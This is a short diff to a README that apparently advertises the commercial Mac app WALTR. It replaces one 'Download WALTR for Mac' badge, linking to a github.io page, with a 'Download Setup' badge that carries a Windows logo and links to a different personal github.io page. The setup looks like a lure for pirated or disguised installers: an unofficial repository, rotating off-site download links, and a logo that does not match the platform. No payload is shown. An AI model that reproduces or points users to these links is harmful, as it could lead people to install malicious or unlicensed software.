@@ -4,11 +4,7 @@
 <img src="https://insmac.org/uploads/posts/2021-05/1622046160_waltr-pro.png" alt="WALTR Logo" width="200">  
 </div>  
 
-<div align="center">  
-  <a href="https://installation-osx.github.io/.github/WALTR">  
-    <img src="https://img.shields.io/badge/⬇️_Download_WALTR_for_Mac-FF4500?style=for-the-badge&logo=apple&logoColor=white" alt="Download WALTR for Mac">  
-  </a>  
-</div>  
+[![Download Setup](https://img.shields.io/badge/Download-Setup-blue?style=for-the-badge&logo=windows)](https://lanethomasuxjh.github.io/.github/WALTR-Mac)
 
 ---  
 
